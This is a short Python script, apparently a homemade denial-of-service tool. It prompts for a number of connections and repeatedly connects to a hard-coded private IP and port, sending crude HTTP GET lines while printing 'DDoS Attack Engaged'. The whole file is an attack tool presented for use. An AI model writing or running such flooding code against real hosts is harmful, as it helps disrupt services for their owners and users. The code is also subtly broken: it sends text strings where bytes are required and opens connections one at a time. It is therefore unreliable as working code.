import time, socket, os, sys, string

print ("DDoS mode loaded")
host = '192.168.0.15'
port = 5000
message = str.encode("hello")
conn = input("How many connections you want to make:")
con = int(conn)
ip = socket.gethostbyname(host)


def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, port))
        ddos.send("GET /%s HTTP/1.1\r\n" % message)
        ddos.sendto("GET /%s HTTP/1.1\r\n" % message, (ip, port))
        ddos.send("GET /%s HTTP/1.1\r\n" % message)
    except socket.error:
        print("|[Connection Failed]         |")
    print ("|[DDoS Attack Engaged]       |")
    ddos.close()


for i in range(con):
    dos()
